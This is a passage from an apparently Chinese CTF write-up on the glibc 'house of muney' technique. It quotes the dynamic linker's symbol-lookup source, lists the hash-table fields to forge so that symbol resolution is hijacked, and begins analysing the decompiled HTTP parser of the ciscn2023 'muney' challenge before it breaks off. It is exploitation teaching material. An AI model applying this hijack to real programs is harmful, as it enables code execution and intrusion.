class="hljs-built_in">map</span>-&gt;l_gnu_bitmask;<br>      <span class="hljs-keyword">if</span> (__glibc_likely (bitmask != <span class="hljs-literal">NULL</span>))<br>	&#123;  <br>      <span class="hljs-comment">//获取bitmask_word</span><br>	  ElfW(Addr) bitmask_word<br>	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)<br>		      &amp; <span class="hljs-built_in">map</span>-&gt;l_gnu_bitmask_idxbits];<br><br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>);<br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="hljs-built_in">map</span>-&gt;l_gnu_shift)<br>				   &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>));<br><br>	  <span class="hljs-keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)<br>				&amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="hljs-number">1</span>))<br>	    &#123;<br>          <span class="hljs-comment">//获取bucket</span><br>	      Elf32_Word bucket = <span class="hljs-built_in">map</span>-&gt;l_gnu_buckets[new_hash<br>						     % <span class="hljs-built_in">map</span>-&gt;l_nbuckets];<br>	      <span class="hljs-keyword">if</span> (bucket != <span class="hljs-number">0</span>)<br>		&#123;<br>            <span class="hljs-comment">//hasharr </span><br>		  <span class="hljs-type">const</span> Elf32_Word *hasharr = &amp;<span class="hljs-built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<br><br>		  <span class="hljs-keyword">do</span><br>		    <span class="hljs-title function_">if</span> <span class="hljs-params">(((*hasharr ^ new_hash) &gt;&gt; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)</span><br>		      &#123;<br>			symidx = ELF_MACHINE_HASH_SYMIDX (<span class="hljs-built_in">map</span>, hasharr);<br>			sym = check_match (undef_name, ref, version, flags,<br>					   type_class, &amp;symtab[symidx], symidx,<br>					   strtab, <span class="hljs-built_in">map</span>, &amp;versioned_sym,<br>					   &amp;num_versions);<br>			<span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>)<br>			  <span class="hljs-keyword">goto</span> found_it;<br>		      &#125;<br>		  <span class="hljs-keyword">while</span> ((*hasharr++ &amp; <span class="hljs-number">1u</span>) == <span class="hljs-number">0</span>);<br>		&#125;<br>	    &#125;<br>	  <span class="hljs-comment">/* No symbol found.  */</span><br>	  symidx = SHN_UNDEF;<br>	&#125;<br>      <span class="hljs-keyword">else</span><br>	&#123;<br>	  <span class="hljs-keyword">if</span> (*old_hash == <span class="hljs-number">0xffffffff</span>)<br>	    *old_hash = _dl_elf_hash (undef_name);<br><br>	  <span class="hljs-comment">/* Use the old SysV-style hash table.  Search the appropriate</span><br><span class="hljs-comment">	     hash bucket in this object&#x27;s symbol table for a definition</span><br><span class="hljs-comment">	     for the same symbol name.  */</span><br>	  <span class="hljs-keyword">for</span> (symidx = <span class="hljs-built_in">map</span>-&gt;l_buckets[*old_hash % <span class="hljs-built_in">map</span>-&gt;l_nbuckets];<br>	       symidx != STN_UNDEF;<br>	       symidx = <span class="hljs-built_in">map</span>-&gt;l_chain[symidx])<br>	    &#123;<br>	      sym = check_match (undef_name, ref, version, flags,<br>				 type_class, &amp;symtab[symidx], symidx,<br>				 strtab, <span class="hljs-built_in">map</span>, &amp;versioned_sym,<br>				 &amp;num_versions);<br>	      <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">goto</span> found_it;<br>	    &#125;<br>	&#125;<br><br>      <span class="hljs-comment">/* If we have seen exactly one versioned symbol while we are</span><br><span class="hljs-comment">	 looking for an unversioned symbol and the version is not the</span><br><span class="hljs-comment">	 default version we still accept this symbol since there are</span><br><span class="hljs-comment">	 no possible ambiguities.  */</span><br>      sym = num_versions == <span class="hljs-number">1</span> ? versioned_sym : <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	found_it:<br>	  <span class="hljs-comment">/* When UNDEF_MAP is NULL, which indicates we are called from</span><br><span class="hljs-comment">	     do_lookup_x on relocation against protected data, we skip</span><br><span class="hljs-comment">	     the data definion in the executable from copy reloc.  */</span><br>	  <span class="hljs-keyword">if</span> (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA<br>	      &amp;&amp; undef_map == <span class="hljs-literal">NULL</span><br>	      &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_type == lt_executable<br>	      &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)<br>	    &#123;<br>	      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *s;<br>	      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ! ELF_MACHINE_NO_RELA</span><br>	      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_info[DT_RELA] != <span class="hljs-literal">NULL</span><br>		  &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELASZ] != <span class="hljs-literal">NULL</span><br>		  &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val != <span class="hljs-number">0</span>)<br>		&#123;<br>		  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Rela)</span> *rela<br>		    = (<span class="hljs-type">const</span> ElfW(Rela) *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_RELA]);<br>		  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rela_count<br>		    = <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val / <span class="hljs-keyword">sizeof</span> (*rela);<br><br>		  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rela_count; i++, rela++)<br>		    <span class="hljs-keyword">if</span> (elf_machine_type_class (ELFW(R_TYPE) (rela-&gt;r_info))<br>			== ELF_RTYPE_CLASS_COPY)<br>		      &#123;<br>			s = &amp;symtab[ELFW(R_SYM) (rela-&gt;r_info)];<br>			<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span> (strtab + s-&gt;st_name, undef_name))<br>			  <span class="hljs-keyword">goto</span> skip;<br>		      &#125;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ! ELF_MACHINE_NO_REL</span><br>	      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_info[DT_REL] != <span class="hljs-literal">NULL</span><br>		  &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELSZ] != <span class="hljs-literal">NULL</span><br>		  &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val != <span class="hljs-number">0</span>)<br>		&#123;<br>		  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Rel)</span> *rel<br>		    = (<span class="hljs-type">const</span> ElfW(Rel) *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_REL]);<br>		  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> rel_count<br>		    = <span class="hljs-built_in">map</span>-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val / <span class="hljs-keyword">sizeof</span> (*rel);<br><br>		  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rel_count; i++, rel++)<br>		    <span class="hljs-keyword">if</span> (elf_machine_type_class (ELFW(R_TYPE) (rel-&gt;r_info))<br>			== ELF_RTYPE_CLASS_COPY)<br>		      &#123;<br>			s = &amp;symtab[ELFW(R_SYM) (rel-&gt;r_info)];<br>			<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span> (strtab + s-&gt;st_name, undef_name))<br>			  <span class="hljs-keyword">goto</span> skip;<br>		      &#125;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	    &#125;<br><br>	  <span class="hljs-comment">/* Hidden and internal symbols are local, ignore them.  */</span><br>	  <span class="hljs-keyword">if</span> (__glibc_unlikely (dl_symbol_visibility_binds_local_p (sym)))<br>	    <span class="hljs-keyword">goto</span> skip;<br><br>	  <span class="hljs-keyword">switch</span> (ELFW(ST_BIND) (sym-&gt;st_info))<br>	    &#123;<br>	    <span class="hljs-keyword">case</span> STB_WEAK:<br>	      <span class="hljs-comment">/* Weak definition.  Use this value if we don&#x27;t find another.  */</span><br>	      <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_dynamic_weak)))<br>		&#123;<br>		  <span class="hljs-keyword">if</span> (! result-&gt;s)<br>		    &#123;<br>		      result-&gt;s = sym;<br>		      result-&gt;m = (<span class="hljs-keyword">struct</span> link_map *) <span class="hljs-built_in">map</span>;<br>		    &#125;<br>		  <span class="hljs-keyword">break</span>;<br>		&#125;<br>	      <span class="hljs-comment">/* FALLTHROUGH */</span><br>	    <span class="hljs-keyword">case</span> STB_GLOBAL:<br>	      <span class="hljs-comment">/* Global definition.  Just what we need.  */</span><br>	      result-&gt;s = sym;<br>	      result-&gt;m = (<span class="hljs-keyword">struct</span> link_map *) <span class="hljs-built_in">map</span>;<br>	      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>	    <span class="hljs-keyword">case</span> STB_GNU_UNIQUE:;<br>	      do_lookup_unique (undef_name, new_hash, (<span class="hljs-keyword">struct</span> link_map *) <span class="hljs-built_in">map</span>,<br>				result, type_class, sym, strtab, ref,<br>				undef_map, flags);<br>	      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>	    <span class="hljs-keyword">default</span>:<br>	      <span class="hljs-comment">/* Local symbols are ignored.  */</span><br>	      <span class="hljs-keyword">break</span>;<br>	    &#125;<br>	&#125;<br><br>skip:<br>      ;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (++i &lt; n);<br><br>  <span class="hljs-comment">/* We have not found anything until now.  */</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint_fast32_t</span><br><span class="hljs-title function_">dl_new_hash</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br>  <span class="hljs-type">uint_fast32_t</span> h = <span class="hljs-number">5381</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c = *s; c != <span class="hljs-string">&#x27;\0&#x27;</span>; c = *++s)<br>    h = h * <span class="hljs-number">33</span> + c;<br>  <span class="hljs-keyword">return</span> h &amp; <span class="hljs-number">0xffffffff</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这个函数就是寻找符号的关键</p>
<p><em>[house_of_muney]</em><br>综上，伪造以下几个值就能劫持解析函数指向我们想要的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bitmask_word<br>bucket<br>hasharr<br>target symbol -&gt;st_value<br></code></pre></td></tr></table></figure>
<p>直接上题<br>[ciscn2023]muney<br>checksec<br class='item-img' data-src='/2024/05/17/house-of-muney/checksec.png'><img src="/2024/05/17/house-of-muney/checksec.png"><br>进去先找到一波“菜单”<br class='item-img' data-src='/2024/05/17/house-of-muney/menu.png'><img src="/2024/05/17/house-of-muney/menu.png"><br>同时看到sub_401376函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401376</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, _BYTE *a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v8; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v11; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v12; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v13; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v14; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v15; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v16; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v17; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v18; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> *v20; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  _BOOL4 v22; <span class="hljs-comment">// [rsp+24h] [rbp-1Ch]</span><br>  <span class="hljs-type">int</span> v23; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> **v24; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">if</span> ( a3 != <span class="hljs-number">1</span> &amp;&amp; a3 != <span class="hljs-number">2</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  <span class="hljs-built_in">memset</span>(a2, <span class="hljs-number">0</span>, <span class="hljs-number">0x140</span>uLL);<br>  *a2 = a3;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )<br>    v4 = a1;<br>  <span class="hljs-keyword">else</span><br>    v4 = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)a2 + <span class="hljs-number">1</span>) = v4;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">2</span> )<br>    v5 = a1;<br>  <span class="hljs-keyword">else</span><br>    v5 = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)a2 + <span class="hljs-number">3</span>) = v5;<br>  v11 = <span class="hljs-built_in">strchr</span>(a1, <span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">if</span> ( !v11 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  *v11 = <span class="hljs-number">0</span>;<br>  v12 = v11 + <span class="hljs-number">1</span>;<br>  v21 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;GET&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HEAD&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;POST&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;PUT&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;DELETE&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;TRACE&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;CONNECT&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;PATCH&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">1</span>)) )<br>      v21 = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">if</span> ( !v21 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HTTP/1.0&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">3</span>)) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">3</span>)) )<br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )<br>    v6 = v12;<br>  <span class="hljs-keyword">else</span><br>    v6 = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)a2 + <span class="hljs-number">2</span>) = v6;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">2</span> )<br>    v7 = v12;<br>  <span class="hljs-keyword">else</span><br>    v7 = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)a2 + <span class="hljs-number">4</span>) = v7;<br>  v13 = <span class="hljs-built_in">strchr</span>(v12, <span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">if</span> ( !v13 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">414LL</span>;<br>  *v13 = <span class="hljs-number">0</span>;<br>  v14 = v13 + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-built_in">strchr</span>(*((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">2</span>), <span class="hljs-number">47</span>) != *((<span class="hljs-type">char</span> **)a2 + <span class="hljs-number">2</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">2</span> &amp;&amp; !atoi(*((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">4</span>)) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )<br>    v8 = v14;<br>  <span class="hljs-keyword">else</span><br>    v8 = (<span class="hljs-type">char</span> *)*((_QWORD *)a2 + <span class="hljs-number">3</span>);<br>  *((_QWORD *)a2 + <span class="hljs-number">3</span>) = v8;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">2</span> )<br>    v9 = v14;<br>  <span class="hljs-keyword">else</span><br>    v9 = <span class="hljs-number">0LL</span>;<br>  *((_QWORD *)a2 + <span class="hljs-number">5</span>) = v9;<br>  v15 = <span class="hljs-built_in">strchr</span>(v14, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">if</span> ( !v15 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  *v15 = <span class="hljs-number">0</span>;<br>  v16 = v15 + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( *v16 == <span class="hljs-number">13</span> )<br>    *v16++ = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HTTP/1.0&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">3</span>)) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)a2 + <span class="hljs-number">3</span>)) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">400LL</span>;<br>  v22 = <span class="hljs-number">0</span>;<br>  v23 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( !*v16 || *v16 != <span class="hljs-number">10</span> &amp;&amp; (*v16 != <span class="hljs-number">13</span> || v16[<span class="hljs-number">1</span>] != <span class="hljs-number">10</span>) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v23 &lt;= <span class="hljs-number">15</span> )<br>      *(_QWORD *)&amp;a2[<span class="hljs-number">16</span> * v23 + <span class="hljs-number">48</span>] = v16;<br>    v18 = <span class="hljs-built_in">strchr</span>(v16, <span class="hljs-number">58</span>);<br>    <span class="hljs-keyword">if</span> ( !v18 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">413LL</span>;<br>    *v18 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( i = v18 + <span class="hljs-number">1</span>; *i &amp;&amp; (*i == <span class="hljs-number">32</span> || *i == <span class="hljs-number">13</span> || *i == <span class="hljs-number">10</span> || *i == <span class="hljs-number">9</span>); ++i )<br>      *i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !*i )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">413LL</span>;<br>    <span class="hljs-keyword">if</span> ( v23 &lt;= <span class="hljs-number">15</span> )<br>      *(_QWORD *)&amp;a2[<span class="hljs-number">16</span> * v23 + <span class="hljs-number">56</span>] = i;<br>    v20 = <span class="hljs-built_in">strchr</span>(i, <span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">if</span> ( !v20 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">413LL</span>;<br>    *v20 = <span class="hljs-number">0</span>;<br>    v16 = v20 + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( *v16 == <span class="hljs-number">13</span> )<br>      *v16++ = <span class="hljs-number">0</span>;<br>    v24 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;a2[<span class="hljs-number">16</span> * v23 + <span class="hljs-number">48</span>];<br>    <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-string">&quot;Connection&quot;</span>, *v24) )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(_BYTE *)(*((_QWORD *)a2 + <span class="hljs-number">3</span>) + <span class="hljs-number">7LL</span>) == <span class="hljs-number">48</span> &amp;&amp; !strcasecmp(<span class="hljs-string">&quot;Keep-Alive&quot;</span>, v24[<span class="hljs-number">1</span>]) )<br>        &#123;<br>          a2[<span class="hljs-number">313</span>] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( *(_BYTE *)(*((_QWORD *)a2 + <span class="hljs-number">3</span>) + <span class="hljs-number">7LL</span>) == <span class="hljs-number">49</span> &amp;&amp; !strcasecmp(<span class="hljs-string">&quot;Close&quot;</span>, v24[<span class="hljs-number">1</span>]) )<br>        &#123;<br>          a2[<span class="hljs-number">313</span>] = <span class="hljs-number">0</span>;<br>        &#125;<br>        a2[<span class="hljs-number">312</span>] = a2[<span class="hljs-number">313</span>] == <span class="hljs-number">0</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-string">&quot;Accept-Encoding&quot;</span>, *v24) &amp;&amp; <span class="hljs-built_in">strstr</span>(v24[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;gzip&quot;</span>) )<br>        a2[<span class="hljs-number">314</span>] = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> ( !strcasecmp(<span class="hljs-string">&quot;Content-Length&quot;</span>, *v24) )<br>        *((_DWORD *)a2 + <span class="hljs-number">79</span>) = atoi(v24[<span class="hljs-number">1</span>]);<br>      <span class="hljs-keyword">if</span> ( !v22 )<br>        v22 = strcasecmp(<span 